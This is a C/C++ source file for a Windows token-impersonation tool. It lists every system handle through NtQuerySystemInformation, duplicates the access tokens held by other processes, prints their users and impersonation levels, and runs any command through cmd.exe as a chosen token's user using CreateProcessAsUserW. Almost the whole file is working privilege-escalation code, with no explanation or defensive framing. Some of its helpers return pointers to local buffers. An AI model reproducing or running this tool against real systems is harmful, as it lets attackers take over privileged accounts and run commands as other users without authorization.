#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll")

#define MAX_USERNAME_LENGTH 256
#define MAX_DOMAINNAME_LENGTH 15
#define FULL_NAME_LENGTH 271
#define TOKEN_TYPE_LENGTH 30
#define COMMAND_LENGTH 1000
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH             ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW                  ((NTSTATUS)0x80000005L)
#define SystemHandleInformation                 16
#define SystemHandleInformationSize             1024 * 1024 * 10
#define OB_TYPE_INDEX_TOKEN 4


typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(WINAPI* NTQUERYSYSTEMINFORMATION)(
    DWORD SystemInformationClass,
    PVOID SystemInformation,
    DWORD SystemInformationLength,
    PDWORD ReturnLength
);

typedef enum _POOL_TYPE{
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(
    HANDLE ObjectHandle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID ObjectInformation,
    DWORD Length,
    PDWORD ResultLength
);

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING* POBJECT_NAME_INFORMATION;

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct {
    BOOL valid;
    int token_id;
    HANDLE token_handle;
    wchar_t owner_name[FULL_NAME_LENGTH];
    wchar_t user_name[FULL_NAME_LENGTH];
    wchar_t TokenType[100];
    wchar_t TokenImpersonationLevel[100];
}TOKEN;

void duplicate_and_launch(HANDLE token, wchar_t* command) {
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    HANDLE duplicated_token;
    if (DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token) != 0){
        CreateProcessAsUserW(duplicated_token, NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
        CloseHandle(duplicated_token);
        exit(0);
    }
    else {
        printf("Duplication failed... Exiting\n");
        exit(0);
    }
}

wchar_t* get_token_owner_info(HANDLE token) {
    wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH], full_name[FULL_NAME_LENGTH];
    SID_NAME_USE sid;
    DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
    if (!GetTokenInformation(token, TokenOwner, NULL, 0, &token_info)) {
        PTOKEN_OWNER TokenStatisticsInformation = (PTOKEN_OWNER)GlobalAlloc(GPTR, token_info);
        if (GetTokenInformation(token, TokenOwner, TokenStatisticsInformation, token_info, &token_info)) {
            LookupAccountSidW(NULL, ((TOKEN_OWNER*)TokenStatisticsInformation)->Owner, username, &user_length, domain, &domain_length, &sid);
            _snwprintf_s(full_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);
            return full_name;
        }
    }
}

wchar_t* get_token_user_info(HANDLE token) {
    wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH], full_name[FULL_NAME_LENGTH];
    DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
    SID_NAME_USE sid;
    if (!GetTokenInformation(token, TokenUser, NULL, 0, &token_info)) {
        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
        if (GetTokenInformation(token, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
            LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
            _snwprintf_s(full_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);
            return full_name;
        }
    }
}

TOKEN* is_impersonate_token(TOKEN* TOKEN_INFO) {
    DWORD returned_tokinfo_length, returned_tokimp_length;
    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            if (TokenStatisticsInformation->TokenType == TokenImpersonation) {
                wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenImpersonation");
                wchar_t* token_owner;
                token_owner = get_token_owner_info(TOKEN_INFO->token_handle);
                wcscpy_s(TOKEN_INFO->owner_name, FULL_NAME_LENGTH, token_owner);
                wchar_t* token_user;
                token_user = get_token_user_info(TOKEN_INFO->token_handle);
                wcscpy_s(TOKEN_INFO->user_name, FULL_NAME_LENGTH, token_user);
                if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
                    PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_length);
                    if (GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) >= SecurityImpersonation) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityImpersonation");
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityDelegation");
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityAnonymous");
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityIdentification");
                        }
                    }
                    TOKEN_INFO->valid = 0;
                    return TOKEN_INFO;
                } 
            }
        }
    }
    return TOKEN_INFO;
}
TOKEN* is_primary_token(TOKEN* TOKEN_INFO) {
    DWORD returned_tokinfo_length, returned_tokimp_length;
    if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(TOKEN_INFO->token_handle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            if (TokenStatisticsInformation->TokenType == TokenPrimary) {
                wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenPrimary");
                wchar_t* token_owner;
                token_owner = get_token_owner_info(TOKEN_INFO->token_handle);
                wcscpy_s(TOKEN_INFO->owner_name, FULL_NAME_LENGTH, token_owner);
                wchar_t* token_user;
                token_user = get_token_user_info(TOKEN_INFO->token_handle);
                wcscpy_s(TOKEN_INFO->user_name, FULL_NAME_LENGTH, token_user);
                if (!GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
                    PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_length);
                    if (GetTokenInformation(TOKEN_INFO->token_handle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) >= SecurityImpersonation) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityImpersonation");
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityDelegation");
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityAnonymous");
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
                            wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_TYPE_LENGTH, L"SecurityIdentification");
                        }
                    }
                    TOKEN_INFO->valid = 0;
                    return TOKEN_INFO;
                }
            }
        }
    }
    return TOKEN_INFO;
}

LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass){
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) {
        data = (LPWSTR)calloc(pObjectInfo->Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
    }
    free(pObjectInfo);
    return data;
}

int wmain(int argc, wchar_t* argv[]) {

    printf("[*] Listing available tokens\n");
    ULONG returnLenght = 0;
    TOKEN found_tokens[30];
    int nbrsfoundtokens = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
    
    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];
        HANDLE dupHandle;
        
        HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if (process == INVALID_HANDLE_VALUE) {
            CloseHandle(process);
            continue;
        }

        if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0) {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        POBJECT_TYPE_INFORMATION objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(8192);
        LPWSTR lpwsType = GetObjectInfo(dupHandle, ObjectTypeInformation);

        if (wcscmp(lpwsType, L"Token")){
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        TOKEN TOKEN_INFO;
        TOKEN_INFO.valid = 1;
        TOKEN_INFO.token_handle = dupHandle;
        is_primary_token(&TOKEN_INFO);
        is_impersonate_token(&TOKEN_INFO);
        
        if (TOKEN_INFO.valid == 0) {

            int is_new_token = 0;
            for (int j = 0; j <= nbrsfoundtokens; j++) {
                if (wcscmp(found_tokens[j].user_name, TOKEN_INFO.user_name) == 0 && wcscmp(found_tokens[j].TokenType, TOKEN_INFO.TokenType) == 0 && wcscmp(found_tokens[j].TokenImpersonationLevel, TOKEN_INFO.TokenImpersonationLevel) == 0) {
                    is_new_token = 1;
                }
            }

            if (is_new_token == 0) {
                TOKEN_INFO.token_id = nbrsfoundtokens;
                found_tokens[nbrsfoundtokens] = TOKEN_INFO;
                nbrsfoundtokens += 1;
            }
        }
        CloseHandle(process);
    }

    for (int k = 0; k < nbrsfoundtokens; k++) {
        printf("[ID: %d][%ws][%ws] Owner: %ws | User: %ws\n", found_tokens[k].token_id, found_tokens[k].TokenType, found_tokens[k].TokenImpersonationLevel, found_tokens[k].owner_name, found_tokens[k].user_name);
    }

    if (argc == 3) {
        wchar_t command[COMMAND_LENGTH];
        int selected_token = _wtoi(argv[1]);
        _snwprintf_s(command, COMMAND_LENGTH, L"cmd.exe /c %ws", argv[2]);
        for (int k = 0; k < nbrsfoundtokens; k++) {
            if (found_tokens[k].token_id == selected_token) {
                printf("[*] Impersonating %ws and launching command [%ws]...\n", found_tokens[k].user_name, command);
                duplicate_and_launch(found_tokens[k].token_handle, command);
            }
        }
    }
    return 0;
}
